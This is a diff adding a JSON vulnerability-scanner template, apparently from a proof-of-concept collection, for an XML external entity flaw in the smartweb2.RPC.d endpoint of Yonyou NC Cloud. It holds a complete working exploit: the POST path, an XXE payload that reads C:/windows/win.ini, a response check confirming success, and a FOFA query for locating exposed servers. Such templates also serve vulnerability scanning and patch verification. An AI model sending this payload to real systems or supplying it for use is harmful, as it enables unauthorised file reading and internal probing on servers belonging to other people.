@@ -1,0 +1,36 @@
+{
+  "product": "用友NC Cloud",
+  "vul_name": "用友NC Cloud smartweb2.RPC.d XML外部实体注入",
+  "type": "外部实体注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友NC系统的smartweb2.RPC.d接口存在XML外部实体注入漏洞，攻击者可以利用该漏洞进行文件读取、内网端口扫描等攻击。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-UFIDA-NC\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17775864.html",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/hrss/dorado/smartweb2.RPC.d?__rpc=true",
+      "data": "__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM \"file:///C://windows//win.ini\" >]><rpc transaction=\"10\" method=\"resetPwd\"><vps><p name=\"__profileKeys\">%26Password;</p ></vps></rpc>"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "for 16-bit app support"
+        }
+      ]
+    }
+  }
+}
